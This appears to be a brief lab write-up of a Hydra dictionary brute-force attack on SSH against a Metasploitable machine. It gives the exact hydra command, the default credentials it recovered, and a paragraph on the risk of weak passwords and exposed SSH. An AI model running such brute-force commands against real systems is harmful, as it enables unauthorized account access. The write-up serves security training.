# Hydra SSH Brute Force Attack (Metasploitable)

**Target IP**: 192.168.1.107  
**Port**: 22 (SSH)  
**Tool**: Hydra  
**Attack Type**: Dictionary brute-force (user and password lists)

---

### Command Used:
```bash
hydra -l msfadmin -P pass.txt ssh://192.168.1.107

Result:
Login successful!
Username: msfadmin
Password: msfadmin

Real-World Relevance:
This simulates a brute-force attack that demonstrates how default or weak credentials can lead to full system access. This is a critical risk in real-world environments, especially when SSH is exposed to the internet without proper protections like fail2ban, strong passwords, or key-based authentication.


